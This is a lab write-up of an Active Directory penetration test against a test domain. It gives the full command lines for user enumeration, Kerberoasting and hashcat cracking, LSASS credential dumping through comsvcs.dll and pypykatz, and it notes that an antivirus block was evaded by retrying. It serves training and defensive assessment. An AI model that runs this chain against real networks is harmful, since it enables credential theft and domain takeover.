# Active Directory Penetration Test — test.local

A full Active Directory penetration test report on a lab domain (test.local), documenting a complete attack chain from initial foothold to Domain Admin via enumeration, Kerberoasting, credential dumping, and BloodHound analysis.

## Environment

| Item | Value |
|---|---|
| Domain | test.local (NetBIOS: TEST) |
| Domain Controller | PCD19.test.local — 192.168.1.100 — Windows Server 2019 |
| Workstation | PC1.test.local — 192.168.1.20 — Windows 10 Pro |
| Attacker Platform | Kali Linux |
| Network | 192.168.1.0/24 (Oracle VirtualBox Lab) |

## Tools Used

| Tool | Purpose |
|---|---|
| **fping** | Fast ICMP sweep for live-host discovery |
| **Nmap** | Service/version/OS fingerprinting |
| **Kerbrute** | Kerberos pre-auth username enumeration without triggering lockout |
| **smbclient** | SMB null-session / share enumeration |
| **Impacket** (GetADUsers, GetADComputers, GetUserSPNs) | LDAP enumeration and Kerberoasting |
| **Hashcat** | Offline cracking of Kerberos TGS hashes |
| **comsvcs.dll (rundll32)** | LSASS memory dumping (Mimikatz-class, living-off-the-land technique) |
| **pypykatz** | Offline parsing of the LSASS dump to extract credentials |
| **SharpHound / BloodHound** | AD relationship collection and privilege-escalation path analysis |
| **Native Windows commands** (net, nltest, whoami) | Authenticated domain enumeration from a foothold |

---

## Commands Explained

### 1. Host Discovery

```bash
fping -a -s -g -q 192.168.1.0/24
```
ICMP sweep across the 192.168.1.0/24 subnet to identify live hosts. Result: 7 live hosts out of 254, including the Domain Controller at 192.168.1.100.

### 2. Service & OS Fingerprinting

```bash
nmap -v -A -sV -O -iL hosts.txt -oN stask.txt
```
Full scan (-A -sV -O) of discovered hosts to identify services, versions, and OS. Confirmed 192.168.1.100 as a Windows Server 2019 Domain Controller, exposing typical AD ports (Kerberos 88, LDAP 389/3268, SMB 445, WinRM 5985).

### 3. SMB Null-Session Check

```bash
smbclient -L \\192.168.1.100 -N
```
Attempted an unauthenticated SMB connection (-N). Confirmed the DC accepts anonymous sessions, allowing unauthenticated enumeration.

### 4. Kerberos Username Enumeration

```bash
./kerbrute_linux_386 userenum -d test.local --dc 192.168.1.100 rockyou.txt
```
Abuses the difference in Kerberos AS-REQ pre-authentication responses between valid and invalid usernames to confirm real accounts, without counting as a failed logon attempt (no lockout triggered). Result: confirmed `administrator` and `ahmed1` as valid accounts.

### 5. Native Windows Enumeration

Once a foothold was obtained as `ahmed1`, built-in Windows commands were used since they require no extra tooling and generate minimal telemetry:

```powershell
whoami /groups          # list current user's group memberships
whoami /user             # show current user and SID
hostname                 # current machine name
ipconfig /all            # full network configuration
nltest /domain_trusts    # show domain trust relationships
net user /domain         # list all domain user accounts
net group /domain        # list all privileged domain groups
net accounts /domain     # show password and lockout policy
```
Key finding: `net accounts /domain` revealed **Lockout threshold = Never**, meaning no account lockout exists at all — which made password-guessing attempts safe from detection.

### 6. Credential Validation

```bash
impacket-GetADUsers -dc-ip 192.168.1.100 test.local/ahmed1:'passw0eD1'   # incorrect guess — fails
impacket-GetADUsers -dc-ip 192.168.1.100 test.local/ahmed1:'passw0rD1'   # correct — succeeds
impacket-GetADComputers -dc-ip 192.168.1.100 test.local/ahmed1:'passw0rD1'
```
After guessing `ahmed1`'s password (passw0rD1 — only 7 characters, matching the domain's weak password policy), it was validated via LDAP using Impacket. The second command (`GetADComputers`) reused the same credentials to enumerate domain computers (PCD19, PC1).

### 7. Kerberoasting

```bash
impacket-GetUserSPNs -dc-ip 192.168.1.100 'test.local/ahmed1:passw0rD1' -request -outputfile testhash.txt
```
Requests a Kerberos TGS ticket for any account carrying an SPN (here `mohamedhr`, running an MSSQL service), and exports it directly in Hashcat-crackable format (`$krb5tgs$23$...`). Any authenticated domain user can request this ticket without extra privileges.

### 8. Offline Cracking

```bash
hashcat -d 1 -m 13100 -a 0 testhash.txt /home/kali/Downloads/tools/rockyou.txt
```
- `-m 13100` → Kerberos TGS-REP mode (etype 23 / RC4-HMAC)
- `-a 0` → dictionary attack
- Result: cracked `mohamedhr`'s password (Passw0rd2) in ~19 seconds since it was present in rockyou.txt.

### 9. LSASS Memory Dumping

```powershell
rundll32.exe comsvcs.dll, MiniDump (Get-process lsass).Id C:\lsass.dump full
```
Uses a signed Microsoft DLL (`comsvcs.dll`) instead of dropping a tool like Mimikatz, to dump the LSASS process memory which caches credentials for every logged-on session (living-off-the-land technique). Requires local administrator rights on the host (held by `ahmed1` on PC1). Notable detail: the first attempt was blocked by AV, but an immediate retry of the identical command succeeded — a detection gap (Finding 8).

### 10. Offline Parsing

```bash
pypykatz lsa minidump lsass.dump
```
Parses the dump file offline (without running any dumping tool directly on the target) to extract cached credentials, including the Domain Administrator's cleartext password (a result of WDigest being enabled).

### 11. Domain Admin Validation

```bash
impacket-GetADUsers -dc-ip 192.168.1.100 test.local/Administrator:'Aa1231230' -all
```
Uses the recovered Administrator credential for final validation, requesting the full attribute set (`-all`) for every domain user — a query that only succeeds with Domain Admin or equivalent privileges. Success confirms full domain compromise.

---

## Attack Chain Summary

```
Kerbrute (username enum)
        ↓
Password guessing → ahmed1 : passw0rD1  (Weak Password Policy)
        ↓
LDAP enum (Impacket) → mohamedhr has SPN
        ↓
Kerberoasting → crack mohamedhr : Passw0rd2
        ↓
ahmed1 = Local Admin on PC1
        ↓
LSASS Dump (comsvcs.dll) + WDigest enabled
        ↓
pypykatz → Administrator : Aa1231230 (cleartext)
        ↓
Domain Admin Achieved ✅
```

## Classification

**CONFIDENTIAL — For Course/Lab Use Only**
